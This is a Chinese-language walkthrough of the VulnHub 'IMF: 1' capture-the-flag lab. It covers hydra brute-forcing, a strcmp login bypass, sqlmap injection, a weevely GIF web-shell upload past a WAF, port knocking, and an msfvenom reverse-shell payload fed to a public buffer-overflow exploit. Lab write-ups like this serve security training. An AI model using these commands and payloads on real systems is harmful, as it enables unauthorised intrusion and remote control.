# IMF: 1

https://www.vulnhub.com/entry/imf-1,162/

difficulty: Beginner/Moderate

Finish Date：2024-4-13

## IP

192.168.10.159

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
```

只开放了一个端口：80，访问 web 服务，查看源代码，看是否能找到隐藏信息。

## flag1

view-source:http://192.168.10.159/contact.php

```
<!-- flag1{YWxsdGhlZmlsZXM=} -->    --> allthefiles
```

## flag2

发现的几个 js 文件的名，好像是个 base64

```
<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
<script src="js/XUnRhVzVwYzNS.js"></script>
<script src="js/eVlYUnZjZz09fQ==.min.js"></script>
```

组合起来是：ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== --> flag2{aW1mYWRtaW5pc3RyYXRvcg==}

aW1mYWRtaW5pc3RyYXRvcg== --> imfadministrator 像是一个目录名，访问：http://192.168.10.159/imfadministrator/ 显示的是一个登陆框，源代码中有提示： I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger

根据提示，没有使用 SQL，密码是硬编码的，需要获得才能进入。尝试随便输入个用户名和密码，有详细提示：Invalid username.可以先借助这个提示先去找到用户名。

先用 cewl 搜集用户名：cewl -d 3 http://192.168.10.159/ -w user

然后使用 hydra 进行爆破，先找到用户名：

```
hydra -t 20 -L user -p 1 192.168.10.159 -f http-post-form "/imfadministrator/:user=^USER^&pass=1:F=Invalid username."

[80][http-post-form] host: 192.168.10.159   login: rmichaels   password: 1
```

## flag3

根据用户名 rmichaels 去爆破密码，但是没有爆破出来，看样子需要换个方向。根据提示后台代码没有使用 sql 查询，使用的是一个固定的密码，应该是输入的密码和设定的密码进行比较，常用的 php 比较函数是 strcmp，这个函数可能存在绕过的漏洞，猜测后台是利用了 strcmp($POST['pass'],'xxxx')，strcmp 比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值 0，如果返回 0，正好是我们想要的，所以利用 bp 抓包修改数据包为：

```
user=rmichaels&pass[]=1
```

得到页面：

```
flag3{Y29udGludWVUT2Ntcw==}   --> continueTOcms
Welcome, rmichaels<a href='cms.php?pagename=home'>IMF CMS</a>
```

根据提示，访问：http://192.168.10.159/imfadministrator/cms.php?pagename=home 点开上面的三个按钮，分别能显示不同的页面，仔细观察这个参数 pagename=home 好像存在文件包含漏洞，进行漏洞验证，经过尝试后，暂时没有发现文件包含。

再次思考，还有那些地方能需要参数，有可能是 SQL 查询，尝试把参数替换为 pagename=home' or 1=1 -- - 出现了重要信息：Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29

证明我们的思路是对的，直接在 bp 中把访问请求保存到文件中，用 sqlmap 去跑，根据上面错误提示是 mysql 数据库：

```
sqlmap -r req.txt --batch --dbms=mysql --dbs

[*] admin
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

## flag4

admin 数据库中有 pages 表，发现了另外一个页面：tutorials-incomplete，进行访问。http://192.168.10.159/imfadministrator/cms.php?pagename=tutorials-incomplete 页面的图片中有一个二维码，识别看看是什么内容。

得到 flag4：flag4{dXBsb2Fkcjk0Mi5waHA=} --> uploadr942.php 得到了一个上传页面，http://192.168.10.159/imfadministrator/uploadr942.php 应该是能执行 rce 了。

上传文件进行简单测试，发现对文件类型有过滤，只能上传图片类型，需要进行绕过。但是在上传图片后，页面上不能直接显示图片的上传路径，但是查看源代码时，发现会注释一串字符：a7441985e282，不是 base64 编码值，可能是上传后重新随机生成的文件名。经过测试，发现上传的文件存放在路径下：http://192.168.10.159/imfadministrator/uploads/a7441985e282.png

上传 php 图片马时，会有提示 Error: CrappyWAF detected malware. Signature: fsockopen php function detected ，WAF 会对一些特殊函数进行检测。经过寻找，发现上传 gif 时，其中的 php 代码可以被执行，先生成变异的后门代码：

```
weevely generate 123 door.php
```

然后修改后缀名为 door.gif，上传文件时，在 bp 中抓包，给上传内容添加文件头 GIF89a，然后就能正常上传了，访问 http://192.168.10.159/imfadministrator/uploads/a0b2ea8cb63b.gif 能看到我们上传的图片马已经被执行了，继续用 weevely 进行连接。

```
weevely http://192.168.10.159/imfadministrator/uploads/a0b2ea8cb63b.gif 123
```

进行验证，为什么 gif 能够被执行：

```
www-data@imf:/var/www/html/imfadministrator/uploads $ cat .htaccess
AddType application/x-httpd-php .php .gif
AddHandler application/x-httpd-php .gif
```

## flag5

ls 当前目录得到了 flag5.txt：flag5{YWdlbnRzZXJ2aWNlcw==} --> agentservices ，根据提示好像是一个服务名，看看 ps 能不能找到：

```
www-data@imf:/ $ find / -type f -name agent 2>/dev/null
/usr/local/bin/agent
```

或者 cat /etc/services|grep -i agent 也能看到 agent 启动在 7788 端口。

先看看这个文件中有什么信息：strings /usr/local/bin/agent，执行 /usr/local/bin/agent 后发现启动了 7788 端口，并且在 agent 同目录下生成了：

```
www-data@imf:/usr/local/bin $ cat access_codes
SYN 7482,8279,9467
```

提示要进行端口敲门才可以，端口敲门是一种用于限制对端口的访问的技术，方法是仅允许以顺序方式发送或“敲门”某些端口的用户访问端口（打开端口）。例如，服务器可以配置为阻止每个用户访问其 SSH 服务器（端口 22），除非用户将 SYN 数据包发送到预定义的端口序列（1234、4567、8901）。

kali 上安装 knockd : sudo apt-get install knockd，然后对端口 7788 端口进行敲门，开启端口：

```
knock 192.168.10.159 7482:tcp 8279:tcp 9467:tcp
```

这时在用 nmap 扫描，发现 7788 端口已经能够开放。

## flag6

二进制这里不熟悉，找的网上的 exp 进行的利用：https://github.com/secnigma/my_exploits/blob/main/imf/exploit-python3.py ，先修改脚本中 rhost= "192.168.10.159" ，用 msfvenom 生成对应自己机器的 paylaod 对 py 脚本中的相应内容进行替换：

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.3 LPORT=8888 -f python -b "\x00\x0a\x0d"

nc -lvnp 8888

python3 exploit-python3.py
```

最终在反弹的 shell 中，在/root 下得到了 flag6：flag6{R2gwc3RQcm90MGMwbHM=} --> Gh0stProt0c0ls

```
cat Flag.txt
flag6{R2gwc3RQcm90MGMwbHM=}
cat TheEnd.txt
   ____                        _ __   __
  /  _/_ _  ___  ___  ___ ___ (_) /  / /__
 _/ //  ' \/ _ \/ _ \(_-<(_-</ / _ \/ / -_)
/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/
   __  __/_/        _
  /  |/  (_)__ ___ (_)__  ___
 / /|_/ / (_-<(_-</ / _ \/ _ \
/_/__/_/_/___/___/_/\___/_//_/
  / __/__  ___________
 / _// _ \/ __/ __/ -_)
/_/  \___/_/  \__/\__/

Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
Thank you for trying this challenge and please send any feedback.

Geckom
Twitter: @g3ck0ma
Email: geckom@redteamr.com
Web: http://redteamr.com

Special Thanks
Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
Web Advice: Menztrual (@menztrual)
Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)

```
